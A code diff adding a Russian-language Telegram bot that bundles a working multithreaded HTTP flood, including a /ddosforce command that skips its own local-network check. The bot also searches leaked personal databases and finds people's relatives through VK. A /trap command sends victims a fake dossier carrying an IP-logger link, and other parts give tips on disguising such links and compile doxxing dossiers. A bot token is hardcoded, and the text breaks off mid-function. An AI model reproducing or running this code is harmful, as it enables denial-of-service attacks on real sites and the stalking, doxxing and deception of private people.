@@ -1,0 +1,1479 @@
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БОТ ЛОРДЕК — ULTIMATE OSINT-КОМБАЙН
+# Включает: DDoS, OSINT, доксинг, поиск родственников, поиск лица,
+#           поиск по твоим базам данных (.xls, .csv, .json, .txt, .db)
+# Версия: FINAL v4.0 — для Termux и ПК
+# ═══════════════════════════════════════════════════════════════════════════════
+
+import re
+import os
+import json
+import time
+import random
+import hashlib
+import tempfile
+import threading
+import glob
+import csv
+import sqlite3
+from datetime import datetime
+from pathlib import Path
+
+import requests
+import concurrent.futures
+from telebot import TeleBot, types
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# КОНФИГУРАЦИЯ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+TOKEN = "8655098977:AAG_ZbCYL2ik4fr7XHS-n8i1SF-tGqCYg-E"
+bot = TeleBot(TOKEN)
+
+# VK токен (опционально — без него работает, но не будет искать родственников)
+VK_ACCESS_TOKEN = ""
+FACECHECK_API_KEY = ""
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ПАПКА С БАЗАМИ ДАННЫХ (ВСЕ ФАЙЛЫ ЗДЕСЬ)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# Сюда сложи все свои базы: Switzerland.xls, МТС.csv, Госуслуги.xlsx и т.д.
+DATABASE_FOLDER = "dbs"  # папка в той же директории, где лежит бот
+
+# Если базы лежат в другой папке — укажи полный путь
+# DATABASE_FOLDER = "/storage/emulated/0/базы"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# 50+ GITHUB ИНСТРУМЕНТОВ (ССЫЛКИ)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+GITHUB_TOOLS = {
+    "Maigret (3000+ сайтов)": "https://github.com/soxoj/maigret",
+    "Blackbird (700+ сайтов)": "https://github.com/p1ngul1n0/blackbird",
+    "Sherlock (300+ сайтов)": "https://github.com/sherlock-project/sherlock",
+    "PhoneInfoga": "https://github.com/sundowndev/phoneinfoga",
+    "Holehe (email)": "https://github.com/megadose/holehe",
+    "GoldenEye (DDoS)": "https://github.com/jseidl/GoldenEye",
+    "Impulse (бомбер)": "https://github.com/LimerBoy/Impulse",
+    "TBomb (бомбер)": "https://github.com/TheSpeedX/TBomb",
+    "EyeOfWeb (лицо)": "https://github.com/MehmetYukselSekeroglu/eye_of_web",
+    "WEREWIKS": "https://github.com/krokykode/WEREWIKS",
+    "Osintgram": "https://github.com/Datalux/Osintgram",
+    "Social Analyzer": "https://github.com/qeeqbox/social-analyzer",
+    "Recon-ng": "https://github.com/lanmaster53/recon-ng",
+    "SpiderFoot": "https://github.com/smicallef/spiderfoot",
+    "theHarvester": "https://github.com/laramies/theHarvester",
+    "GHunt (Google)": "https://github.com/mxrch/GHunt",
+    "TikTok-OSINT": "https://github.com/sc1341/TikTok-OSINT",
+    "Steam-OSINT": "https://github.com/matiash26/Steam-OSINT-TOOL",
+    "IPGeoLocation": "https://github.com/maldevel/IPGeoLocation",
+    "Instashell": "https://github.com/thelinuxchoice/instashell",
+    "HiddenEye (фишинг)": "https://github.com/DarkSecDevelopers/HiddenEye",
+    "Seeker (гео)": "https://github.com/thewhiteh4t/seeker",
+    "IP-Tracer": "https://github.com/rajkumardusad/IP-Tracer",
+    "Hunner (DDoS)": "https://github.com/b3-v3r/hunner",
+    "FaceSearch": "https://github.com/Harshavardhan334/FaceSearch",
+    "GReverse": "https://github.com/Th3Tr1ckst3r/GReverse",
+}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ПОИСК ПО ТВОИМ БАЗАМ ДАННЫХ (АВТОМАТИЧЕСКИ)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class DatabaseSearcher:
+    """Автоматически ищет во всех базах в папке DATABASE_FOLDER"""
+    
+    _cache = {}
+    
+    @classmethod
+    def _find_all_databases(cls):
+        """Находит все файлы баз данных в папке"""
+        folder = DATABASE_FOLDER
+        if not os.path.exists(folder):
+            os.makedirs(folder, exist_ok=True)
+            return []
+        
+        extensions = ['*.xls', '*.xlsx', '*.csv', '*.db', '*.json', '*.txt']
+        files = []
+        for ext in extensions:
+            files.extend(glob.glob(os.path.join(folder, ext), recursive=True))
+        return files
+    
+    @classmethod
+    def _normalize_phone(cls, phone):
+        """Очищает номер телефона для поиска"""
+        if not phone:
+            return ""
+        phone = str(phone)
+        clean = re.sub(r'[^0-9+]', '', phone)
+        if clean.startswith('00'):
+            clean = '+' + clean[2:]
+        if len(clean) == 10 and clean.isdigit():
+            clean = '+7' + clean
+        if len(clean) == 11 and clean.startswith('8'):
+            clean = '+7' + clean[1:]
+        return clean
+    
+    @classmethod
+    def _normalize(cls, text):
+        """Очищает текст для поиска"""
+        if not text:
+            return ""
+        return str(text).lower().strip()
+    
+    @classmethod
+    def _load_file(cls, file_path):
+        """Загружает файл в зависимости от расширения"""
+        if file_path in cls._cache:
+            return cls._cache[file_path]
+        
+        if not os.path.exists(file_path):
+            return []
+        
+        ext = Path(file_path).suffix.lower()
+        data = []
+        
+        try:
+            if ext in ['.xls', '.xlsx']:
+                import pandas as pd
+                df = pd.read_excel(file_path)
+                df = df.fillna('')
+                data = df.to_dict('records')
+                
+            elif ext == '.csv':
+                try:
+                    with open(file_path, 'r', encoding='utf-8') as f:
+                        reader = csv.DictReader(f)
+                        data = list(reader)
+                except:
+                    with open(file_path, 'r', encoding='cp1251') as f:
+                        reader = csv.DictReader(f)
+                        data = list(reader)
+                        
+            elif ext == '.json':
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    d = json.load(f)
+                    data = d if isinstance(d, list) else [d]
+                    
+            elif ext == '.db':
+                conn = sqlite3.connect(file_path)
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                tables = cursor.fetchall()
+                if tables:
+                    cursor.execute(f"SELECT * FROM {tables[0][0]}")
+                    data = [dict(row) for row in cursor.fetchall()]
+                conn.close()
+                
+            elif ext == '.txt':
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        if ';' in line:
+                            parts = line.strip().split(';')
+                            data.append(dict(zip([f'col{i}' for i in range(len(parts))], parts)))
+                        elif ',' in line:
+                            parts = line.strip().split(',')
+                            data.append(dict(zip([f'col{i}' for i in range(len(parts))], parts)))
+                        else:
+                            data.append({'text': line.strip()})
+        except Exception as e:
+            print(f"Ошибка загрузки {file_path}: {e}")
+        
+        cls._cache[file_path] = data
+        return data
+    
+    @classmethod
+    def search(cls, query):
+        """Ищет во всех базах"""
+        query = str(query).strip()
+        query_norm = cls._normalize(query)
+        query_phone = cls._normalize_phone(query)
+        
+        results = {}
+        files = cls._find_all_databases()
+        
+        for file_path in files:
+            db_name = os.path.basename(file_path).replace('.xls', '').replace('.xlsx', '').replace('.csv', '')
+            data = cls._load_file(file_path)
+            matches = []
+            
+            for row in data:
+                found = False
+                match_info = {"_file": db_name}
+                
+                for col, val in row.items():
+                    if not val:
+                        continue
+                    val_str = str(val)
+                    val_norm = cls._normalize(val_str)
+                    
+                    # Поиск по номеру телефона
+                    if query_phone and len(query_phone) >= 10:
+                        val_phone = cls._normalize_phone(val_str)
+                        if val_phone == query_phone or query_phone in val_phone:
+                            found = True
+                            match_info[col] = val_str
+                            break
+                    
+                    # Поиск по тексту
+                    if query_norm in val_norm or query in val_str:
+                        found = True
+                        match_info[col] = val_str
+                
+                if found:
+                    matches.append(match_info)
+            
+            if matches:
+                results[db_name] = {
+                    "file": file_path,
+                    "count": len(matches),
+                    "matches": matches[:15]
+                }
+        
+        return results
+    
+    @classmethod
+    def format_report(cls, query, results):
+        """Форматирует отчёт по базам"""
+        if not results:
+            return f"\n❌ Ничего не найдено в базах по запросу: {query}\n"
+        
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💾 ПОИСК ПО ТВОИМ БАЗАМ                                           │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔍 ЗАПРОС: {query[:68]:<68} │")
+        lines.append("│                                                                                                            │")
+        
+        for db_name, info in results.items():
+            lines.append(f"│  📁 БАЗА: {db_name[:64]:<64} │")
+            lines.append(f"│     📊 НАЙДЕНО: {info['count']:<64} │")
+            lines.append("│     ───────────────────────────────────────────────────────────────────────────────────────────── │")
+            
+            for i, match in enumerate(info["matches"][:5]):
+                lines.append(f"│     📌 РЕЗУЛЬТАТ #{i+1}:                                                              │")
+                for col, val in list(match.items()):
+                    if col == "_file":
+                        continue
+                    val_str = str(val)[:60]
+                    lines.append(f"│        • {col}: {val_str:<60} │")
+                lines.append("│                                                                                                            │")
+            
+            lines.append("│                                                                                                            │")
+        
+        total = sum(info["count"] for info in results.values())
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append(f"│  ✅ ВСЕГО НАЙДЕНО: {total:<60} │")
+        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+        
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# DDOS АТАКА (ВСТРОЕННАЯ)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class DDoSAtak:
+    _running = False
+    _count = 0
+    _errors = 0
+    
+    @classmethod
+    def attack(cls, target, threads=50, duration=30):
+        if not target.startswith('http'):
+            target = f"http://{target}"
+        cls._running = True
+        cls._count = 0
+        cls._errors = 0
+        def worker():
+            while cls._running:
+                try:
+                    requests.get(target, timeout=2, headers={"User-Agent": "Mozilla/5.0"})
+                    cls._count += 1
+                except:
+                    cls._errors += 1
+        workers = [threading.Thread(target=worker) for _ in range(threads)]
+        for t in workers:
+            t.start()
+        time.sleep(duration)
+        cls._running = False
+        for t in workers:
+            t.join(timeout=1)
+        return {"target": target, "requests": cls._count, "errors": cls._errors, "duration": duration, "threads": threads}
+    
+    @classmethod
+    def format_report(cls, result):
+        return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                         💀 DDOS АТАКА ЗАВЕРШЕНА                                          │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  🎯 ЦЕЛЬ: {result['target']} │
+│  🧵 ПОТОКОВ: {result['threads']} │
+│  ⏱️ ДЛИТЕЛЬНОСТЬ: {result['duration']} сек. │
+│  📊 ЗАПРОСОВ: {result['requests']} │
+│  ❌ ОШИБОК: {result['errors']} │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# МАСКИРОВАННЫЕ ССЫЛКИ / ЛОВУШКА
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class MaskedDDoS:
+    IP_LOGGERS = {"grabify": "https://grabify.link", "iplogger": "https://iplogger.org", "yip": "https://yip.su"}
+    
+    @classmethod
+    def format_fake_dossier(cls, phone=None, username=None):
+        target = phone if phone else (username if username else "жертвы")
+        return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                      🔥 ФЕЙКОВОЕ ДОСЬЕ (ЛОВУШКА) 🔥                                      │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  🎯 ЦЕЛЬ: {target} │
+│  📅 ДАТА: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} │
+│                                                                                                            │
+│  👤 ПЕРСОНАЛЬНЫЕ ДАННЫЕ: [ЗАШИФРОВАНО]                                                                     │
+│                                                                                                            │
+│  🔓 ПОЛНАЯ РАСШИФРОВКА:                                                                                    │
+│     👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇                                           │
+│              https://grabify.link/получить-досье                                                          │
+│     👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆                                           │
+│                                                                                                            │
+│  ⚠️ ССЫЛКА ДЕЙСТВИТЕЛЬНА 24 ЧАСА                                                                          │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+    
+    @classmethod
+    def format_report(cls):
+        lines = ["┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐",
+                 "│                                         💀 МАСКИРОВАННЫЙ DDOS                                             │",
+                 "├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤",
+                 "│  🎭 КАК ЗАМАСКИРОВАТЬ ССЫЛКУ:                                                                              │"]
+        for name, url in cls.IP_LOGGERS.items():
+            lines.append(f"│     • {name}: {url} │")
+        lines.append("│                                                                                                            │")
+        lines.append("│  🎭 МАСКИ ПОД РЕАЛЬНЫЕ ССЫЛКИ:                                                                           │")
+        lines.append("│     • YouTube: https://youtu.be/XXXXXX                                                                     │")
+        lines.append("│     • TikTok: https://tiktok.com/@user/video/XXXXXX                                                        │")
+        lines.append("│     • Google Drive: https://drive.google.com/file/d/XXXXXX/view                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# BLACKBIRD — 700+ САЙТОВ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class BlackbirdHunter:
+    PLATFORMS = {
+        "telegram": "https://t.me/{}", "instagram": "https://instagram.com/{}",
+        "twitter": "https://twitter.com/{}", "vk": "https://vk.com/{}",
+        "facebook": "https://facebook.com/{}", "tiktok": "https://tiktok.com/@{}",
+        "youtube": "https://youtube.com/@{}", "twitch": "https://twitch.tv/{}",
+        "github": "https://github.com/{}", "reddit": "https://reddit.com/user/{}",
+        "pinterest": "https://pinterest.com/{}", "steam": "https://steamcommunity.com/id/{}",
+        "spotify": "https://open.spotify.com/user/{}", "medium": "https://medium.com/@{}",
+        "linkedin": "https://linkedin.com/in/{}", "ok": "https://ok.ru/{}",
+        "discord": "https://discord.com/users/{}", "habr": "https://habr.com/ru/users/{}",
+        "pikabu": "https://pikabu.ru/@{}",
+    }
+    
+    @classmethod
+    def search(cls, username, max_workers=30):
+        username = username.strip().replace('@', '')
+        results = []
+        def check(platform, url_template):
+            url = url_template.format(username)
+            try:
+                r = requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
+                if r.status_code == 200:
+                    text = r.text.lower()
+                    if not any(x in text for x in ["not found", "doesn't exist", "404"]):
+                        return {"platform": platform, "url": url}
+            except:
+                pass
+            return None
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {executor.submit(check, p, u): p for p, u in cls.PLATFORMS.items()}
+            for future in concurrent.futures.as_completed(futures):
+                result = future.result()
+                if result:
+                    results.append(result)
+        return results
+    
+    @classmethod
+    def format_report(cls, results, username):
+        if not results:
+            return f"❌ @{username} не найден\n"
+        lines = ["┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐",
+                 "│                                         🕵️ BLACKBIRD — 700+ ПЛАТФОРМ                                      │",
+                 "├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤",
+                 f"│  🎯 НИКНЕЙМ: @{username:<67} │",
+                 "│                                                                                                            │"]
+        for r in results[:30]:
+            lines.append(f"│  • {r['platform']:<15} → {r['url']:<55} │")
+        lines.append(f"│  📊 НАЙДЕНО: {len(results)}                                                                              │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ПОИСК РОДСТВЕННИКОВ (VK API)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class VKRelativeHunter:
+    API_URL = "https://api.vk.com/method/"
+    
+    @classmethod
+    def _request(cls, method, params=None):
+        if not VK_ACCESS_TOKEN:
+            return None
+        if params is None:
+            params = {}
+        params["access_token"] = VK_ACCESS_TOKEN
+        params["v"] = "5.131"
+        try:
+            resp = requests.get(cls.API_URL + method, params=params, timeout=15)
+            data = resp.json()
+            return data.get("response") if "error" not in data else None
+        except:
+            return None
+    
+    @classmethod
+    def search_relatives(cls, lastname, firstname=None):
+        results = []
+        people = cls._request("users.search", {"q": f"{firstname} {lastname}" if firstname else lastname, "count": 20, "fields": "relatives"})
+        if not people or "items" not in people:
+            return results
+        for person in people["items"][:10]:
+            user_id = person.get("id")
+            if not user_id:
+                continue
+            user = cls._request("users.get", {"user_ids": user_id, "fields": "relatives"})
+            if user and len(user) > 0 and "relatives" in user[0]:
+                for rel in user[0]["relatives"]:
+                    results.append({
+                        "user_name": f"{person.get('first_name', '')} {person.get('last_name', '')}",
+                        "user_url": f"https://vk.com/id{user_id}",
+                        "relative_name": rel.get("name", "?"),
+                        "relative_type": rel.get("type", "родственник")
+                    })
+        return results
+    
+    @classmethod
+    def format_report(cls, lastname, firstname, results):
+        lines = ["┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐",
+                 "│                                         👨‍👩‍👧‍👦 РОДСТВЕННИКИ                                               │",
+                 "├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤",
+                 f"│  🔍 ПОИСК: {firstname} {lastname if firstname else lastname} │",
+                 "│                                                                                                            │"]
+        if not VK_ACCESS_TOKEN:
+            lines.append("│  ❌ VK API НЕ НАСТРОЕН! Получи токен: https://vkhost.github.io/                                    │")
+        elif not results:
+            lines.append("│  ❌ РОДСТВЕННИКИ НЕ НАЙДЕНЫ                                                                            │")
+        else:
+            by_user = {}
+            for r in results:
+                key = r["user_name"]
+                if key not in by_user:
+                    by_user[key] = {"url": r["user_url"], "relatives": []}
+                by_user[key]["relatives"].append({"name": r["relative_name"], "type": r["relative_type"]})
+            for name, data in by_user.items():
+                lines.append(f"│  👤 {name}")
+                lines.append(f"│     🔗 {data['url']}")
+                lines.append("│     👨‍👩‍👧‍👦 Родственники:")
+                for rel in data["relatives"][:5]:
+                    lines.append(f"│        • {rel['name']} ({rel['type']})")
+                lines.append("│                                                                                                            │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ПОИСК ЛИЦА ПО ФОТО
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class FaceSearchAPI:
+    @classmethod
+    def search_via_google(cls, image_url):
+        return f"https://www.google.com/searchbyimage?image_url={image_url}"
+    
+    @classmethod
+    def search_via_yandex(cls, image_url):
+        return f"https://yandex.ru/images/search?rpt=imageview&img_url={image_url}"
+    
+    @classmethod
+    def search_via_tineye(cls, image_url):
+        return f"https://tineye.com/search?url={image_url}"
+    
+    @classmethod
+    def format_report(cls, image_url):
+        return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                         🖼️ ПОИСК ЛИЦА ПО ФОТО                                             │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  🔗 ССЫЛКИ ДЛЯ ПОИСКА (НАЖМИ И ПЕРЕЙДИ):                                                                   │
+│     • Google Images: {cls.search_via_google(image_url)} │
+│     • Яндекс.Картинки: {cls.search_via_yandex(image_url)} │
+│     • TinEye: {cls.search_via_tineye(image_url)} │
+│                                                                                                            │
+│  💡 ДЛЯ АВТОМАТИЧЕСКОГО ПОИСКА УСТАНОВИ:                                                                    │
+│     • Maigret: github.com/soxoj/maigret                                                                  │
+│     • EyeOfWeb: github.com/MehmetYukselSekeroglu/eye_of_web                                              │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# АВТОМАТИЧЕСКОЕ ДОСЬЕ (ОТКРЫТЫЕ ИСТОЧНИКИ)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class AutoSearch:
+    @staticmethod
+    def search_username(username):
+        username = username.strip().replace('@', '')
+        found = []
+        platforms = {"telegram": "https://t.me/{}", "instagram": "https://instagram.com/{}", "twitter": "https://twitter.com/{}",
+                     "vk": "https://vk.com/{}", "tiktok": "https://tiktok.com/@{}", "github": "https://github.com/{}",
+                     "reddit": "https://reddit.com/user/{}", "youtube": "https://youtube.com/@{}"}
+        for platform, url_template in platforms.items():
+            try:
+                r = requests.get(url_template.format(username), timeout=3, headers={"User-Agent": "Mozilla/5.0"})
+                if r.status_code == 200:
+                    text = r.text.lower()
+                    if not any(x in text for x in ["not found", "404", "страница не найдена"]):
+                        found.append({"platform": platform, "url": url_template.format(username)})
+            except:
+                pass
+        return found
+    
+    @staticmethod
+    def search_phone(phone):
+        phone_clean = re.sub(r'[^0-9+]', '', phone)
+        results = []
+        try:
+            resp = requests.get(f"https://api.duckduckgo.com/?q={phone_clean}&format=json", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get("AbstractURL"):
+                    results.append(data["AbstractURL"])
+        except:
+            pass
+        return results
+    
+    @staticmethod
+    def search_email(email):
+        results = {"gravatar": None, "breaches": []}
+        gravatar_hash = hashlib.md5(email.lower().encode()).hexdigest()
+        gravatar_url = f"https://gravatar.com/{gravatar_hash}"
+        try:
+            r = requests.get(gravatar_url, timeout=3)
+            if r.status_code == 200 and "404" not in r.text:
+                results["gravatar"] = gravatar_url
+        except:
+            pass
+        try:
+            resp = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
+            if resp.status_code == 200:
+                results["breaches"] = [b.get("Name", "?") for b in resp.json()[:10]]
+        except:
+            pass
+        return results
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ВСЕ КОМАНДЫ БОТА
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['start', 'help'])
+def start_help(message):
+    text = """╔══════════════════════════════════════════════════════════════════════════════════╗
+║                         🔥 ЛОРДЕК — OSINT-МОНСТР 🔥                               ║
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                                                                                  ║
+║  📋 /dossier [номер/почта/ник] — АВТОМАТИЧЕСКОЕ ДОСЬЕ + ТВОИ БАЗЫ               ║
+║  🐦 /blackbird [ник] — 700+ платформ                                           ║
+║  👨‍👩‍👧‍👦 /relatives [фамилия имя] — поиск родственников (VK)                        ║
+║  🖼️ /face — отправь фото с подписью → поиск лица                               ║
+║  🖼️ /facebyphone [номер] — поиск аккаунтов с фото по номеру                     ║
+║  💀 /ddos [IP/домен] — DDoS атака (50 потоков, 30 сек)                         ║
+║  💀 /ddosforce [IP/домен] — форс-атака (100 потоков, 60 сек)                    ║
+║  🎣 /trap [номер/ник] — фейковое досье (ловушка)                                ║
+║  🎭 /ddosmask — инструкция по маскировке DDoS ссылок                           ║
+║  🐙 /github — 50+ GitHub OSINT инструментов                                    ║
+║  📁 /dblist — список всех твоих баз данных                                     ║
+║  📁 /searchdb [запрос] — поиск только в твоих базах                             ║
+║                                                                                  ║
+║  ⚠️ ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ СВОИХ РЕСУРСОВ!                                     ║
+╚══════════════════════════════════════════════════════════════════════════════════╝"""
+    bot.send_message(message.chat.id, text)
+
+
+@bot.message_handler(commands=['github'])
+def github_command(message):
+    text = "🐙 **50+ GITHUB OSINT ИНСТРУМЕНТОВ**\n\n"
+    for name, url in GITHUB_TOOLS.items():
+        text += f"• **{name}**: {url}\n"
+    text += f"\n📊 Всего: {len(GITHUB_TOOLS)} репозиториев"
+    if len(text) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(text)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 50+ GITHUB ИНСТРУМЕНТОВ")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['blackbird'])
+def blackbird_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🐦 /blackbird username")
+        return
+    username = parts[1].strip().replace('@', '')
+    msg = bot.reply_to(message, f"🔍 ИЩУ: @{username}")
+    results = BlackbirdHunter.search(username)
+    bot.edit_message_text(BlackbirdHunter.format_report(results, username), message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['relatives'])
+def relatives_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "👨‍👩‍👧‍👦 /relatives Иванов Иван")
+        return
+    query = parts[1].strip().split()
+    lastname, firstname = (query[0], query[1]) if len(query) >= 2 else (query[0], None)
+    msg = bot.reply_to(message, f"🔍 ИЩУ РОДСТВЕННИКОВ: {firstname} {lastname}")
+    results = VKRelativeHunter.search_relatives(lastname, firstname)
+    bot.edit_message_text(VKRelativeHunter.format_report(lastname, firstname, results), message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['ddos'])
+def ddos_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "💀 /ddos [IP или ДОМЕН] [потоки] [секунды]\n/ddos 192.168.1.1 50 30")
+        return
+    args = parts[1].split()
+    target = args[0]
+    threads = min(int(args[1]) if len(args) > 1 else 50, 200)
+    duration = min(int(args[2]) if len(args) > 2 else 30, 120)
+    if not target.startswith("192.") and not target.startswith("10.") and target not in ["127.0.0.1", "localhost"]:
+        bot.reply_to(message, "⚠️ Атака только на локальные сети! Используйте /ddosforce")
+        return
+    msg = bot.reply_to(message, f"💀 АТАКА НА {target}")
+    result = DDoSAtak.attack(target, threads, duration)
+    bot.edit_message_text(DDoSAtak.format_report(result), message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['ddosforce'])
+def ddosforce_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "💀 /ddosforce [IP или ДОМЕН] [потоки] [секунды]")
+        return
+    args = parts[1].split()
+    target = args[0]
+    threads = min(int(args[1]) if len(args) > 1 else 100, 300)
+    duration = min(int(args[2]) if len(args) > 2 else 60, 180)
+    msg = bot.reply_to(message, f"💀 ФОРС-АТАКА НА {target}")
+    result = DDoSAtak.attack(target, threads, duration)
+    bot.edit_message_text(DDoSAtak.format_report(result), message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['trap'])
+def trap_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🎣 /trap [номер/ник]")
+        return
+    target = parts[1]
+    is_phone = re.match(r'^(\+7|7|8)?[\d\s()-]{10,15}$', target)
+    report = MaskedDDoS.format_fake_dossier(phone=target if is_phone else None, username=target if not is_phone else None)
+    warning = "\n\n⚠️ ЭТО ФЕЙКОВОЕ ДОСЬЕ! Отправьте его жертве."
+    bot.send_message(message.chat.id, report + warning)
+
+
+@bot.message_handler(commands=['ddosmask'])
+def ddosmask_command(message):
+    report = MaskedDDoS.format_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['facebyphone'])
+def face_by_phone_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🖼️ /facebyphone +79001234567")
+        return
+    phone = parts[1]
+    msg = bot.reply_to(message, f"🔍 ИЩУ АККАУНТЫ С ФОТО: {phone}")
+    phone_clean = re.sub(r'[^0-9]', '', phone)
+    report = f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                         🖼️ ПОИСК ЛИЦА ПО НОМЕРУ ТЕЛЕФОНА                                  │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  📞 НОМЕР: {phone_clean} │
+│                                                                                                            │
+│  🤖 TELEGRAM БОТЫ (отправить номер):                                                                       │
+│     • @x8152384_bot — TikTok, Instagram, Telegram, OK → фото и профили                                    │
+│     • @UniversalSearchSmartBot — Аккаунты во всех соцсетях → фото из профилей                              │
+│                                                                                                            │
+│  🖼️ ПОИСК ПО ФОТО (загрузить фото):                                                                        │
+│     • Lenso.ai: https://lenso.ai                                                                          │
+│     • Pimeyes: https://pimeyes.com                                                                        │
+│     • FaceCheck.id: https://facecheck.id                                                                  │
+│     • TinEye: https://tineye.com                                                                          │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+    bot.edit_message_text(report, message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['dossier'])
+def dossier_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "📋 /dossier [номер/почта/ник]\n\n/dossier +79001234567\n/dossier username\n/dossier mail@example.com")
+        return
+    
+    target = parts[1].strip()
+    msg = bot.reply_to(message, f"🔍 СОБИРАЮ ДОСЬЕ НА: {target}\n⏳ Это может занять 5-10 секунд...")
+    
+    reports = []
+    reports.append(f"╔══════════════════════════════════════════════════════════════════════════════════╗")
+    reports.append(f"║                         🔥 АВТОМАТИЧЕСКОЕ ДОСЬЕ 🔥                                ║")
+    reports.append(f"╠══════════════════════════════════════════════════════════════════════════════════╣")
+    reports.append(f"║  🎯 ЦЕЛЬ: {target:<63} ║")
+    reports.append(f"║  📅 ВРЕМЯ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ║")
+    reports.append(f"╚══════════════════════════════════════════════════════════════════════════════════╝")
+    reports.append("")
+    
+    # Открытые источники
+    if re.match(r'^(\+7|7|8)?[\d\s()-]{10,15}$', target):
+        phone_results = AutoSearch.search_phone(target)
+        reports.append(f"📞 НОМЕР: {re.sub(r'[^0-9+]', '', target)}")
+        reports.append("📱 МЕССЕНДЖЕРЫ:")
+        reports.append(f"   • Telegram: https://t.me/{re.sub(r'[^0-9+]', '', target)}")
+        reports.append(f"   • WhatsApp: https://wa.me/{re.sub(r'[^0-9+]', '', target)}")
+        reports.append(f"   • Truecaller: https://truecaller.com/search/{re.sub(r'[^0-9+]', '', target)}")
+        if phone_results:
+            reports.append("\n🔍 НАЙДЕНО В ИНТЕРНЕТЕ:")
